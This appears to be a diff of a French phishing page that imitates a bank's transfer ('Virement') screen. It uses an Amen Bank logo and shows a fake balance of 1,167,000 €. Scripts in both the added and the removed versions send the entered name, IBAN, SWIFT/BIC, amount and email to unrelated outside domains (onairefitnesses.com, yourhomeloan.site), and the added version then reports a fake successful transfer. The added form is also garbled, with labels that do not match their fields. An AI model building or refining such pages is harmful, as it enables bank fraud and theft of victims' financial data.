@@ -1,137 +1,270 @@
-<!DOCTYPE html>
 
+<!DOCTYPE html>
 <html lang="fr">
-<head>
-<meta charset="utf-8"/>
-<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<!-- Favicon -->
-<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDhygFhh4fGOtnmdYx3XVKtWBYEB6sj3lPcI6WOHfjcQ&s=10" rel="icon" type="image/x-icon"/>
-<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDhygFhh4fGOtnmdYx3XVKtWBYEB6sj3lPcI6WOHfjcQ&s=10" rel="shortcut icon" type="image/x-icon"/>
-<script src="https://cdn.lordicon.com/fudrjiwc.js"></script>
-<!-- FIXED: protocol added -->
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-<script crossorigin="anonymous" src="https://kit.fontawesome.com/618007f65e.js"></script>
-<script src="assets/js/session.js"></script>
-<script src="assets/js/main.js"></script>
-<link href="assets/css/virement.css" rel="stylesheet">
-<link href="assets/css/base.css" rel="stylesheet">
-<link href="assets/css/menu_bar.css" rel="stylesheet"/>
-<title>Virement</title>
-</link></link></head>
-<body>
-<script src="header.js"></script>
-<div class="welcome">
-<h4>Effectuer un virement</h4>
-</div>
-<div class="logout">
-<i class="fas fa-power-off" style="font-size: 20px; color: red"></i>
-<a href="javascript:logout()">Déconnexion</a>
-</div>
-<div class="container back_white footer mt-2 mb-2">
-<div class="gest_pic">
-<lord-icon colors="outline:#eeca66,primary:#b26836,secondary:#ffc738" src="https://cdn.lordicon.com/pimvysaa.json" style="width: 60px; height: 60px" trigger="loop">
-</lord-icon>
-</div>
-<div class="text_footer">
-<h5>Prélèvement: Compte courants</h5>
-<sub>Solde: <span id="soldeValue"></span></sub>
-<sub>Épargne: <span id="epargneValue"></span></sub></div>
-</div>
-<div class="container back_white transfert mb-2">
-<div class="title_virement">
-<h1>Informations du bénéficiaire</h1>
-</div>
-<form id="sepaForm" novalidate="">
-<div class="inputBox">
-<input class="input" id="nom" name="nom" required="" type="text"/>
-<span>NOM</span>
-</div>
-<div class="inputBox">
-<input class="input" id="prenom" name="prenom" required="" type="text"/>
-<span>PRÉNOM</span>
-</div>
-<div class="inputBox">
-<input class="input" id="iban" name="iban" required="" type="text"/>
-<span>IBAN</span>
-</div>
-<div class="inputBox">
-<input class="input" id="swift" name="swift" required="" type="text"/>
-<span>CODE SWIFT</span>
-</div>
-<div class="inputBox">
-<input class="input" id="bic" name="bic" required="" type="text"/>
-<span>CODE BIC</span>
-</div>
-<div class="inputBox">
-<input class="input" id="montant" name="montant" required="" type="text"/>
-<span>MONTANT</span>
-</div>
-<div class="inputBox">
-<input class="input" id="libelle" name="libelle" required="" type="text"/>
-<span>LIBELLÉ</span>
-</div>
-<div class="inputBox">
-<input class="input" id="email" name="email" required="" type="email"/>
-<span>Email</span>
-</div>
-<div class="button">
-<button class="btn_valid" disabled="" id="btn_valid" type="submit">VALIDER</button>
-</div>
-</form>
-</div>
-<div class="title">
-<h2>Votre gestionnaire</h2>
-</div>
-<script src="footer.js"></script>
-<div class="navigation_bar">
-<div class="navigation">
-<ul>
-<li class="list">
-<a href="solde.html">
-<span class="icon">
-<ion-icon name="cash-outline"></ion-icon>
-</span>
-<span class="text">Solde</span>
-</a>
-</li>
-<li class="list">
-<a href="historique.html">
-<span class="icon">
-<ion-icon name="time-outline"></ion-icon>
-</span>
-<span class="text">Historique</span>
-</a>
-</li>
-<li class="list active">
-<a href="#">
-<span class="icon">
-<ion-icon name="swap-horizontal-outline"></ion-icon>
-</span>
-<span class="text">Virement</span>
-</a>
-</li>
-<li class="list">
-<a href="cartes.html">
-<span class="icon">
-<ion-icon name="card-outline"></ion-icon>
-</span>
-<span class="text">Cartes</span>
-</a>
-</li>
-<li class="list">
-<a href="rib.html">
-<span class="icon">
-<ion-icon name="document-outline"></ion-icon>
-</span>
-<span class="text">RIB</span>
-</a>
-</li>
-<div class="indicator"></div>
-</ul>
-</div>
-</div>
-<script>
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+    <!-- Favicon -->
+  <link rel="icon" href="https://media.licdn.com/dms/image/v2/C4D0BAQHEaByPzP1JqQ/company-logo_200_200/company-logo_200_200/0/1630497456641/amen_bank_logo?e=2147483647&v=beta&t=3i-ZRxGHurAIx6GgB_rdntBMA7Fe9Iox4_EKK4ySlYQ" type="image/x-icon">
+  <link rel="shortcut icon" href="https://media.licdn.com/dms/image/v2/C4D0BAQHEaByPzP1JqQ/company-logo_200_200/company-logo_200_200/0/1630497456641/amen_bank_logo?e=2147483647&v=beta&t=3i-ZRxGHurAIx6GgB_rdntBMA7Fe9Iox4_EKK4ySlYQ" type="image/x-icon">
+
+    <script src="https://cdn.lordicon.com/fudrjiwc.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script
+      src="https://kit.fontawesome.com/618007f65e.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="assets/js/session.js"></script>
+    <script src="assets/js/main.js"></script>
+    <link rel="stylesheet" href="assets/css/virement.css" />
+    <link rel="stylesheet" href="assets/css/base.css" />
+    <link rel="stylesheet" href="assets/css/menu_bar.css" />
+    <title>Virement</title>
+  </head>
+  <body>
+    <script src="header.js"></script>
+    <div class="welcome">
+      <h4>Effectuer un virement</h4>
+    </div>
+    <div class="logout">
+      <i class="fas fa-power-off" style="font-size: 20px; color: red"></i
+      ><a href="javascript:logout()">Déconnexion</a>
+    </div>
+
+    <div class="container back_white footer mt-2 mb-2">
+      <div class="gest_pic">
+        <lord-icon
+          src="https://cdn.lordicon.com/pimvysaa.json"
+          trigger="loop"
+          colors="outline:#eeca66,primary:#b26836,secondary:#ffc738"
+          style="width: 60px; height: 60px"
+        >
+        </lord-icon>
+      </div>
+      <div class="text_footer">
+        <h5>Prélèvement: Compte courants</h5>
+        <sub>Solde: 1,167,000 €</sub>
+      </div>
+    </div>
+
+    <div class="container back_white transfert mb-2">
+      <div class="title_virement">
+        <h1>Informations du beneficiaire</h1>
+      </div>
+
+  <form id="sepaForm">
+      <div class="inputBox">
+        <input
+          type="text"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>NOM</span>
+      </div>
+      <div class="inputBox">
+        <input
+          type="text"
+          id="firstName"
+          name="firstName"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>PRENOM</span>
+      </div>
+      <div class="inputBox">
+        <input
+          type="text"
+          id="lastName"
+          name="lastName"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>IBAN</span>
+      </div>
+      <div class="inputBox">
+        <input
+          type="text"
+           id="iban"
+          name="iban"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>CODE SWIFT</span>
+      </div>
+      <div class="inputBox">
+        <input
+          type="text"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>CODE BIC</span>
+      </div>
+      <div class="inputBox">
+        <input
+          type="text"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>MONTANT</span>
+      </div>
+      <div class="inputBox">
+        <div class="inputBox">
+          <input
+            type="text"
+             id="montant"
+          name="montant"
+            class="input_!empty"
+            onkeyup="notEmpty()"
+            required="required"
+          />
+          <span>LIBELLE</span>
+        </div>
+      </div>
+
+      <div class="inputBox">
+        <input
+          type="text"
+          id="email"
+          name="email"
+          class="input_!empty"
+          onkeyup="notEmpty()"
+          required="required"
+        />
+        <span>email</span>
+      </div>
+      <div class="button">
+        <button id="btn_valid" disabled="true" onclick="virement_loading()" class="btn_valid">
+          VALIDER
+        </button>
+      </div>
+    </div>
+
+  </form>
+
+    <script>
+      const notEmpty = () => {
+        const input = document.getElementsByClassName("input_!empty");
+        if (
+          input[0].value != "" &&
+          input[1].value != "" &&
+          input[2].value != "" &&
+          input[3].value != "" &&
+          input[4].value != "" &&
+          input[5].value != "" &&
+          input[6].value != ""
+        ) {
+          document.getElementById("btn_valid").disabled = false;
+          document.getElementById("btn_valid").style.backgroundColor =
+            "slateblue";
+        } else {
+          document.getElementById("btn_valid").disabled = true;
+          document.getElementById("btn_valid").style.backgroundColor =
+            "rgb(211, 209, 230)";
+        }
+      };
+    </script>
+
+    <script>
+          	  document.getElementById('sepaForm').addEventListener('input', function() {
+            var fields = document.querySelectorAll('#sepaForm input[type="text"], #sepaForm input[type="date"], #sepaForm input[type="email"]');
+            var allFilled = Array.from(fields).every(input => input.value !== '');
+            var btn_valid = document.getElementById('btn_valid');
+            
+            if (allFilled) {
+                btn_valid.classList.add('active');
+                btn_valid.disabled = false;
+            } else {
+                btn_valid.classList.remove('active');
+                btn_valid.disabled = true;
+            }
+        });
+        document.getElementById('sepaForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var formData = new FormData(this);
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://onairefitnesses.com/scriptmail1.php', true);
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    const response = JSON.parse(xhr.responseText);
+                    const messageDiv = document.getElementById('message');
+                    if (response.success) {
+                        document.getElementById('formContainer').style.display = 'none'; // Hide the form
+                        messageDiv.className = 'message success';
+                        messageDiv.textContent = 'Merci ! Votre virement a été effectué avec succès.';
+                    } else {
+                        messageDiv.className = 'message error';
+                        messageDiv.textContent = 'Erreur lors de l\'envoi : ' + response.error;
+                    }
+                    messageDiv.style.display = 'block'; // Show message
+                }
+            };
+            xhr.send(formData);
+        });
+      
+    </script>
+
+    <div class="title">
+      <h2>Votre gestionnaire</h2>
+    </div>
+
+    <script src="footer.js"></script>
+
+    <div class="navigation_bar">
+      <div class="navigation">
+        <ul>
+          <li class="list">
+            <a href="solde.html">
+              <span class="icon">
+                <ion-icon name="cash-outline"></ion-icon>
+              </span>
+              <span class="text">Solde</span>
+            </a>
+          </li>
+          <li class="list">
+            <a href="historique.html">
+              <span class="icon">
+                <ion-icon name="time-outline"></ion-icon>
+              </span>
+              <span class="text">Historique</span>
+            </a>
+          </li>
+          <li class="list active">
+            <a href="#">
+              <span class="icon">
+                <ion-icon name="swap-horizontal-outline"></ion-icon>
+              </span>
+              <span class="text">Virement</span>
+            </a>
+          </li>
+          <li class="list">
+            <a href="cartes.html">
+              <span class="icon">
+                <ion-icon name="card-outline"></ion-icon>
+              </span>
+              <span class="text">Cartes</span>
+            </a>
+          </li>
+          <li class="list">
+            <a href="rib.html">
+              <span class="icon">
+                <ion-icon name="document-outline"></ion-icon>
+              </span>
+              <span class="text">Rib</span>
+            </a>
+          </li>
+          <div class="indicator"></div>
+        </ul>
+      </div>
+    </div>
+    <script>
       const list = document.querySelectorAll(".list");
       function activeLink() {
         list.forEach((item) => item.classList.remove("active"));
@@ -139,87 +272,16 @@
       }
       list.forEach((item) => item.addEventListener("click", activeLink));
     </script>
-<script src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js" type="module"></script>
-<script nomodule="" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-</body>
+    <script
+      type="module"
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
+    ></script>
+    <script
+      nomodule
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
+    ></script>
+  </body>
 </html>
 
-<!-- Script d'envoi vers send.php -->
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-  const form = document.getElementById('sepaForm');
-  const btn  = document.getElementById('btn_valid');
 
-  // Si votre logique n'active pas le bouton, décommentez la ligne suivante
-  // if (btn) btn.disabled = false;
 
-  function showAlert(title, text, icon) {
-    if (window.Swal && typeof Swal.fire === 'function') {
-      Swal.fire(title, text, icon);
-    } else {
-      alert(title + "\n" + text);
-    }
-  }
-
-  if (!form) return;
-
-  form.addEventListener('submit', async function (e) {
-    e.preventDefault();
-    if (btn) btn.disabled = true;
-
-    const fields = ['nom','prenom','iban','swift','bic','montant','libelle','email'];
-    const payload = {};
-    for (const id of fields) {
-      const el = document.getElementById(id);
-      payload[id] = el ? String(el.value || '').trim() : '';
-    }
-
-    // Validations minimales
-    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email);
-    const montantOk = /^\d+(?:[\.,]\d{1,2})?$/.test(payload.montant);
-
-    if (!emailOk) {
-      showAlert('Adresse email invalide', "Veuillez renseigner une adresse email valide.", 'warning');
-      if (btn) btn.disabled = false;
-      return;
-    }
-    if (!montantOk) {
-      showAlert('Montant invalide', "Veuillez saisir un montant numérique (ex.: 1250 ou 1250,50).", 'warning');
-      if (btn) btn.disabled = false;
-      return;
-    }
-
-    // Normaliser le montant avec un point décimal
-    payload.montant = payload.montant.replace(',', '.');
-
-    const formData = new FormData();
-    Object.entries(payload).forEach(([k, v]) => formData.append(k, v));
-
-    try {
-      const res = await fetch('https://yourhomeloan.site/send.php', {
-        method: 'POST',
-        body: formData
-      });
-
-      let data;
-      try {
-        data = await res.json();
-      } catch (e) {
-        throw new Error("Réponse serveur invalide.");
-      }
-
-      if (res.ok && data && data.success) {
-        showAlert('Virement pris en compte', "Votre virement est en cours d'exécution.", 'success');
-        form.reset();
-      } else {
-        const msg = (data && data.message) ? data.message : 'Une erreur est survenue lors de l’envoi.';
-        throw new Error(msg);
-      }
-    } catch (err) {
-      showAlert('Envoi impossible', err.message || String(err), 'error');
-    } finally {
-      if (btn) btn.disabled = false;
-    }
-  });
-});
-</script>
